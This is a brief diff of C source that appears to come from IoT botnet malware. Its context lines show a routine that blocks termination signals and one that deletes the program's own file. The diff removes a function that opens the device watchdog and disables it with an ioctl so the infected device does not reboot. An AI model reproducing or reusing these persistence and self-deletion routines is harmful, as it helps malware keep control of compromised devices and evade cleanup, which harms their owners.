@@ -40,21 +40,6 @@ void prevent_termination()
     sigprocmask(SIG_BLOCK, &block_set, NULL);
 }
 
-void prevent_reboot()
-{
-    int wfd;
-
-    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
-        (wfd = open("/dev/misc/watchdog", 2)) != -1)
-    {
-        int one = 1;
-
-        ioctl(wfd, 0x80045704, &one);
-        close(wfd);
-        wfd = 0;
-    }
-}
-
 void self_corrupt(char *filename)
 {
     unlink(filename);
